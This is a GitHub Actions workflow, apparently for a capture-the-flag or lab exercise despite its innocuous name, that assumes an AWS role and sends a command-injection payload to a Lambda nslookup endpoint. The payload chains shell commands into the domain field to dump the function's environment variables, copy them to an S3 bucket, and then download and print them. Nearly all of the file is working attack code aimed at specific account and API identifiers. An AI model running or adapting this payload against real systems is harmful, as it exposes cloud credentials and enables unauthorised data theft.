name: AWS OIDC test for school standart old code procedure

on:
  push:
    branches:
      - corgi

permissions:
  id-token: write
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Invoke Vulnerable Lambda
        run: |
          API_ID="3q931syi7b"
          REGION="us-east-1"
          URL="https://${API_ID}.execute-api.${REGION}.amazonaws.com/dev/nslookup"
          
          echo "=== 1. CHECKING IF OUR CICD ROLE CAN LIST S3 BUCKETS ==="
          aws s || echo "S3 listing restricted for cicdRole"
          
          echo ""
          echo "=== 2. FORCING LAMBDA TO DROP ENV TO S3 ==="
          # This payload runs env, saves it to /tmp/output.txt, 
          # and uses the Lambda's CLI to upload it to an S3 bucket in the account!
          # (We'll check common bucket names or list them first)
          PAYLOAD='{"domain": "127.0.0.1; env > /tmp/output.txt; aws s3 cp /tmp/output.txt s3://$(aws s3 ls | awk '\''{print $3}'\'' | head -n 1)/flag_drop.txt"}'
          
          curl -s -X POST "$URL" \
            -H "Content-Type: application/json" \
            -d "$PAYLOAD"
          
          echo ""
          echo "=== 3. ATTEMPTING TO READ THE DROPPED FILE FROM S3 ==="
          # Let's see if our runner can download that file from the bucket!
          BUCKET_NAME=$(aws s3 ls 2>/dev/null | awk '{print $3}' | head -n 1)
          if [ ! -z "$BUCKET_NAME" ]; then
            echo "Found bucket: $BUCKET_NAME"
            aws s3 cp "s3://$BUCKET_NAME/flag_drop.txt" ./downloaded_flag.txt || echo "Could not download file"
            cat downloaded_flag.txt || echo "File is empty"
          else
            echo "No accessible S3 bucket found via cicdRole"
          fi
